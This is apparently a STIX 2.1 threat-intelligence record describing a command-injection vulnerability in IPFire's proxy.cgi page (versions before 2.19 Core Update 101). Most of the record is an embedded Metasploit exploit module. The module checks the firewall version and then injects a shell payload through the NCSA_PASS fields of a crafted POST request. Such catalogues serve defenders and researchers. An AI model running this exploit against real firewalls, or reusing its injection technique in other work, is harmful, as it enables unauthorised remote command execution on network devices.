{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b1274f49-557e-4d55-9c46-e58db6ede502",
    "created": "2024-08-14T17:00:35.623554Z",
    "modified": "2024-08-14T17:00:35.623558Z",
    "name": "IPFire proxy.cgi RCE",
    "description": "( IPFire, a free linux based open source firewall distribution version < 2.19 Update Core 101 contains a remote command execution vulnerability in the proxy.cgi page. )",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/ipfire_proxy_exec.rb",
            "external_id": "ipfire_proxy_exec.rb"
        },
        {
            "source_name": "reference",
            "url": "www.ipfire.org/news/ipfire-2-19-core-update-101-released"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  include Msf::Exploit::Remote::HttpClient\n\n  Rank = ExcellentRanking\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name'        => 'IPFire proxy.cgi RCE',\n        'Description' => %q(\n          IPFire, a free linux based open source firewall distribution,\n          version < 2.19 Update Core 101 contains a remote command execution\n          vulnerability in the proxy.cgi page.\n        ),\n        'Author'      =>\n          [\n            'h00die <mike@stcyrsecurity.com>', # module\n            'Yann CAM'                         # discovery\n          ],\n        'References'  =>\n          [\n            [ 'EDB', '39765' ],\n            [ 'URL', 'www.ipfire.org/news/ipfire-2-19-core-update-101-released']\n          ],\n        'License'        => MSF_LICENSE,\n        'Platform'       => 'unix',\n        'Privileged'     => false,\n        'DefaultOptions' => { 'SSL' => true },\n        'Arch'           => [ ARCH_CMD ],\n        'Payload'        =>\n          {\n            'Compat' =>\n              {\n                'PayloadType' => 'cmd',\n                'RequiredCmd' => 'perl awk openssl'\n              }\n          },\n        'Targets'        =>\n          [\n            [ 'Automatic Target', {}]\n          ],\n        'DefaultTarget' => 0,\n        'DisclosureDate' => '2016-05-04'\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('USERNAME', [ true, 'User to login with', 'admin']),\n        OptString.new('PASSWORD', [ false, 'Password to login with', '']),\n        Opt::RPORT(444)\n      ], self.class\n    )\n  end\n\n  def check\n    begin\n      res = send_request_cgi(\n        'uri'       => '/cgi-bin/pakfire.cgi',\n        'method'    => 'GET'\n      )\n      fail_with(Failure::UnexpectedReply, \"#{peer} - Could not connect to web service - no response\") if res.nil?\n      fail_with(Failure::UnexpectedReply, \"#{peer} - Invalid credentials (response code: #{res.code})\") if res.code != 200\n      /\\<strong\\>IPFire (?<version>[\\d.]{4}) \\([\\w]+\\) - Core Update (?<update>[\\d]+)/ =~ res.body\n\n      if version && update && version == \"2.19\" && update.to_i < 101\n        Exploit::CheckCode::Appears\n      else\n        Exploit::CheckCode::Safe\n      end\n    rescue ::Rex::ConnectionError\n      fail_with(Failure::Unreachable, \"#{peer} - Could not connect to the web service\")\n    end\n  end\n\n  def exploit\n    begin\n      # To manually view the vuln page, click to proxy.cgi.  At the bottom\n      # select Local, and save. Ignore the error box, at the bottom of\n      # the page click the button: User Management.\n\n      payload_formatted = \"||#{payload.encoded};#\"\n      post_data =  \"NCSA_USERNAME=#{Rex::Text.rand_text_alpha(10)}\"\n      post_data << \"&NCSA_GROUP=standard\"\n      post_data << \"&NCSA_PASS=#{Rex::Text.uri_encode(payload_formatted)}\"\n      post_data << \"&NCSA_PASS_CONFIRM=#{Rex::Text.uri_encode(payload_formatted)}\"\n      post_data << \"&SUBMIT=Create+user\"\n      post_data << \"&ACTION=Add\"\n      post_data << \"&NCSA_MIN_PASS_LEN=6\"\n\n      res = send_request_cgi(\n        'uri'           => '/cgi-bin/proxy.cgi',\n        'method'        => 'POST',\n        'ctype'         => 'application/x-www-form-urlencoded',\n        'headers'       =>\n          {\n            'Referer' => \"https://#{datastore['RHOST']}:#{datastore['RPORT']}/cgi-bin/proxy.cgi\"\n          },\n        'data'          => post_data\n      )\n\n      # success means we hang our session, and wont get back a response\n      if res\n        fail_with(Failure::UnexpectedReply, \"#{peer} - Could not connect to web service - no response\") if res.nil?\n        fail_with(Failure::UnexpectedReply, \"#{peer} - Invalid credentials (response code: #{res.code})\") if res.code != 200\n      end\n\n    rescue ::Rex::ConnectionError\n      fail_with(Failure::Unreachable, \"#{peer} - Could not connect to the web service\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2016-05-04",
    "x_mitre_platforms": [
        "unix'"
    ]
}